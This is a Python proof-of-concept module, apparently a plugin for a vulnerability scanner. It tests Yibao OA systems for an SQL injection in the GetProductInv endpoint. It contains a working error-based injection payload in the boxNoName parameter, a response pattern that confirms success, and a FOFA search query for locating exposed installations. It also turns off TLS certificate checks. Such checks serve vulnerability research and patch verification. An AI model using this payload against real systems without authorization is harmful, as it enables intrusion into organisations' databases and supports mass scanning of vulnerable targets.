#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/3QFDouDmIr4kRqLqwy-ABA',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '易宝OA GetProductInv接口SQL注入',

      'level'     :   'high',

      'FOFA'      :   'app="顶讯科技-易宝OA系统"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/12',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/SmartTradeScan/Inventory/GetProductInv?boxNoName=1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)))--%20YyAm&positionName=2&productID=3&opeID=4'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'data.*?code.*?message.*?qbppq1qxzzq.*?is_succeed.*?false',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret